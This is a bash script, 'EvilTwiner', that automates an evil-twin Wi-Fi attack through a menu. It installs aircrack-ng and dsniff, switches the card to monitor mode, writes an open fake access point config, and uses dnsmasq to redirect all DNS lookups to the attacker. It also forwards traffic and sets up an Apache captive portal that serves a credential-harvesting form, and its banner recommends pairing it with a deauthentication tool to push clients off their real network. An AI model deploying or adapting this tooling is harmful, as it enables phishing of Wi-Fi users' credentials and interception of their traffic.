 #!/bin/bash

 #### Colors ####
 
green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"

#### Banner ####

Banner(){
echo ${green}
clear
echo 
echo
echo  ''' 

██████████              ███  ████  ███████████                  ██
░░███░░░░░█             ░░░  ░░███ ░█░░░███░░░█                 ░░░
 ░███  █ ░  █████ █████ ████  ░███ ░   ░███  ░  █████ ███ █████ ████  ████████    ██████  ████████
 ░██████   ░░███ ░░███ ░░███  ░███     ░███    ░░███ ░███░░███ ░░███ ░░███░░███  ███░░███░░███░░███
 ░███░░█    ░███  ░███  ░███  ░███     ░███     ░███ ░███ ░███  ░███  ░███ ░███ ░███████  ░███ ░░░
 ░███ ░   █ ░░███ ███   ░███  ░███     ░███     ░░███████████   ░███  ░███ ░███ ░███░░░   ░███
 ██████████  ░░█████    █████ █████    █████     ░░████░████    █████ ████ █████░░██████  █████
░░░░░░░░░░    ░░░░░    ░░░░░ ░░░░░    ░░░░░       ░░░░ ░░░░    ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░


YOOO note you can use this tool combined with WiFiCrasher so please use it cause EvilTwiner dont have DOS attacks for kick out clients of their network.

'''
}                                                       


 #### Variables ####

  Interface=wlo1
  wifiInterfaceMon="${Interface}mon"
  AirMonitor=airmon-ng
  AirDumper=airodump-ng
  DD=dnsmasq
  AP=hostapd
  Server=apache2
  Tool=xterm
  sniffer=tcpdump

#### Countdown ####

CountDown(){
   i=15
until [ $i -lt 0 ]
do
    echo Starting attack in $i
sleep 1
    ((i--))
done
}


 #### Menu option


        Menuoption() {
        Banner
         echo
        
           echo     $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Install requirements (Tools that you need for the attack)"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Make conf for wlan interface (use to make de gateway from youre fake AP)"
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Conf DHCP/DNS for fake AP (The auto conf that the clients gonna get after connect to youre fake AP)"
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Conf fake AP (Basic conf for youre fake AP)"
               echo    $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Enable traffic/forwarding rules (for when you want give internet to the clients)" 
               echo    $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Clean/delete all configuration files for evil twin"
               echo    $purple"{"$cyan"7"$purple"}"$yellow"--"$green"Conf apache2 for captive portal (The required confs for craft youre captive portal)"
               echo    $purple"{"$cyan"8"$purple"}"$yellow"--"$green"Enable/disable captive portal mode (If enabled, clients go to the portal; if not, they have internet without the portal)"
                echo    $purple"{"$cyan"9"$purple"}"$yellow"--"$green"Exit "
                 echo
                            echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " get
  
                                

                                        if [ $get -eq 1 ];
                                        then
                                        echo ""
                                        Install
                                        

                                                elif [ $get -eq 2 ];
                                                then
                                                echo ""
                                                AP

                                                        elif [ $get -eq 3 ];
                                                        then
                                                        echo ""
                                                        DHCP_DNS

                                                                elif [ $get -eq 4 ];
                                                                then

                                                                        FAP

                                                                                elif [ $get -eq 5 ];
                                                                                        then
                                                                         

                                                                         rules
                                                                         
                                                                                  
                                                                                  elif [ $get -eq 6 ];
                                                                                then

                                                                        Clean

                                                                             
                                                                                  elif [ $get -eq 7 ];
                                                                                then

                                                                                Webpage

                                                                                        elif [ $get -eq 8 ];
                                                                                        then

                                                                                        CaptivePortal


                                                                  elif [ $get -eq 9 ];
                                                              then
                                                          echo ${red}                                  
                                                         echo "BYEEE >:)"  
                                                            exit
                                                                  else
                                                                  echo
                                                                  echo wrong option dude :v
                                                                    sleep 2
                                                                    Menuoption
                                                                        fi
                                                                                }



####Install requeriments####

Install(){
sudo apt install aircrack-ng hostapd php dnsmasq iptables openssl apache2 net-tools dsniff -y &&
cd /home &&
sudo mkdir fap
}

####AP interface conf####

AP(){

echo $purple "╭─"$green"Enter youre interface (-_-) "$purple
                           read -p " ╰─$ " wlanin
echo ""
MonitorMode
echo ""

echo $purple "╭─"$green"Enter private ip address class A,B or C for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " ip

echo $purple "╭─"$green"Enter netmask for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " mask

echo $purple "╭─"$green"Enter network ID for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " netID
echo ""

echo "starting ip config on ${wlanin}mon"

sudo ifconfig ${wlanin}mon $ip netmask $mask up &&
sudo route add -net $netID netmask $mask gw $ip
}


####AP DCHP/DNS conf####

DHCP_DNS(){


echo $purple "╭─"$green"Enter the same interface that you use on wlan interface conf option (with mon at the end) (-_-) "$purple
                           read -p " ╰─$ " wlanin

echo $purple "╭─"$green"Enter DHCP range (first start, second end) (-_-) "$purple
                           read -p " ╰─$ " startrange
                           read -p " ╰─$ " endrange

echo $purple "╭─"$green"Enter the same private ip address class A,B or C for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " ip

echo $purple "╭─"$green"Enter the same netmask for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " netmask

echo $purple "╭─"$green"Enter first and second DNS for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " DNS
                           read -p " ╰─$ " DNS2

echo "
 bind-interfaces
 interface=$wlanin
 dhcp-range=$startrange,$endrange,$netmask,12h
 dhcp-option=3,$ip
 dhcp-option=6,$DNS,$DNS2
 server=$DNS
 log-queries
 log-dhcp" >> /home/fap/dnsmasq.conf && sudo cp /home/fap/dnsmasq.conf /etc/dnsmasq.conf
}


####Fake Access Point conf####

FAP(){

echo $purple "╭─"$green"Enter the same interface that you use on wlan interface conf option (with mon at the end) (-_-) "$purple
                           read -p " ╰─$ " wlanin

echo $purple "╭─"$green"Enter SSID for youre fake AP  (-_-) "$purple
                           read -p " ╰─$ " name

echo $purple "╭─"$green"Enter the channel for youre fake AP (-_-) "$purple
                           read -p " ╰─$ " chann

echo $purple "╭─"$green"Enter the same netmask for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " netmask

echo "
interface=$wlanin
driver=nl80211
ssid=$name
bssid=a6:90:74:5d:a1:e4
hw_mode=g
channel=$chann
macaddr_acl=0
ignore_broadcast_ssid=0
wpa=0" >> /home/fap/hostapd.conf


sudo rm /etc/hostapd/hostapd.conf 
sudo cp /home/fap/hostapd.conf /etc/hostapd/hostapd.conf 
sudo systemctl restart $AP
}


####Traffic Rules####

rules(){

echo $purple "╭─"$green"Enter the same interface that you use on wlan interface conf option (with mon at the end) (-_-) "$purple
        read -p " ╰─$ " wlanin

echo $purple "╭─"$green"Enter the interface that you use to give internet on clients of fake network (for example: wlan2) (-_-) "$purple
        read -p " ╰─$ " wlanintwo

sudo iptables -F && sudo iptables -t nat -F &&
sudo iptables --flush && sudo iptables --delete-chain && sudo iptables --table nat --delete-chain

sudo echo 1 > /proc/sys/net/ipv4/ip_forward && 
sudo sysctl -p &&
sudo iptables --table nat --append POSTROUTING --out-interface $wlanintwo -j MASQUERADE && 
sudo iptables --append FORWARD --in-interface $wlanin -j ACCEPT
}


####Cleaning confs####


Clean(){
echo "cleaning ip tables"

sudo iptables -F && sudo iptables -t nat -F &&
sudo iptables --flush && sudo iptables --delete-chain && sudo iptables --table nat --delete-chain

echo "Cleaning default files about services and copying new configurations.."

sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup
sudo cp /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.backup
sudo cp /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/000-default.conf.backup

echo "" > /etc/dnsmasq.conf 
echo "" > /etc/hostapd/hostapd.conf 
echo "" > /etc/apache2/sites-enabled/000-default.conf

sudo cp hostapd.conf /etc/hostapd/hostapd.conf 
sudo cp dnsmasq.conf /etc/dnsmasq.conf 
sudo cp 000-default.conf /etc/apache2/sites-enabled/000-default.conf

echo "Cleaning files on /var/www/html and copying EvilTwin webpage on /var/www/html..."

sudo rm -rf /var/www/html/* &&
sudo cp -r css/ php/ images/ form.html /var/www/html


echo "Restarting services..."

sudo systemctl restart $DD
sudo systemctl restart $AP
sudo systemctl restart $Server
}

####Captive portal auto conf####

Webpage(){

    echo "put the gateway IP you conf for fake AP "
    read -p "└─────►$(tput setaf 7) " IProuter

   echo "<VirtualHost *:80>
        ErrorDocument 404 /

        ServerAdmin webmaster@localhost
        ServerName $IProuter

        # Just redirect if there no is cookie auth
        RewriteEngine On
        RewriteCond %{HTTP_COOKIE} !authenticated
        RewriteRule ^ https://$IProuter/ [R=301,L]

        DocumentRoot /var/www/html/
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>

    <VirtualHost *:443>
        ServerAdmin webmaster@localhost
        ServerName $IProuter

        DocumentRoot /var/www/html/
        SSLEngine on
        SSLCertificateFile /home/fap/cert.pem
        SSLCertificateKeyFile /home/fap/cert.key

        <Directory /var/www/html>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>" >> /home/fap/000-default.conf


sudo a2enmod ssl &&
sudo a2enmod rewrite
sudo openssl req --new -x509 -days 365 -out /home/fap/cert.pem -keyout /home/fap/cert.key
sudo cp /home/fap/000-default.conf /etc/apache2/sites-enabled/000-default.conf
sudo systemctl restart $Server
}



####Captive portal options ####

CaptivePortal(){

           echo     $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Enable captive portal"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Disable captive protal"

                         echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " get

                                        if [ $get -eq 1 ];
                                        then
                                        echo ""
                                        enable
                                        

                                                elif [ $get -eq 2 ];
                                                then
                                                echo ""
                                                disable


fi
}

####Captive portal options actions####

enable(){

echo $purple "╭─"$green"Enter the same interface that you use on wlan interface conf option (with mon at the end) (-_-) "$purple
                           read -p " ╰─$ " wlanin

echo $purple "╭─"$green"Enter the same DHCP range (first start, second end) (-_-) "$purple
                           read -p " ╰─$ " startrange
                           read -p " ╰─$ " endrange

echo $purple "╭─"$green"Enter the same private ip address class A,B or C for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " ip

echo $purple "╭─"$green"Enter the same netmask for $wlanin interface (-_-) "$purple
                           read -p " ╰─$ " netmask

sudo rm /home/fap/dnsmasq.conf &&

echo "
 bind-interfaces
 interface=$wlanin
 dhcp-range=$startrange,$endrange,$netmask,12h
 dhcp-option=3,$ip
 dhcp-option=6,$ip
 address=/#/$ip
 log-queries
 log-dhcp" >> /home/fap/dnsmasq.conf

sudo rm /etc/dnsmasq.conf &&
sudo cp /home/fap/dnsmasq.conf /etc/dnsmasq.conf
sudo systemctl restart $DD
}

disable(){
sudo rm -r /etc/dnsmasq.conf
sudo rm -r /home/fap/dnsmasq.conf
DHCP_DNS
sudo cp /home/fap/dnsmasq.conf /etc/dnsmasq.conf
}


##### Monitor mode #####


MonitorMode(){
       if sudo $AirMonitor start $Interface 
        then echo starting monitor mode with $Interface
        sleep 2
        else
        echo checking if interface its in monitor mode...
                if xterm -e sudo airodump-ng $wifiInterfaceMon == true
                then
  echo Monitor mode enable
  else
  echo "The tool dont start restart the software or the NIC and try again" 
   echo
    echo
    exit
fi
fi
}

FuncioRecon(){
Banner
Menuoption
}     
FuncioRecon                                                  


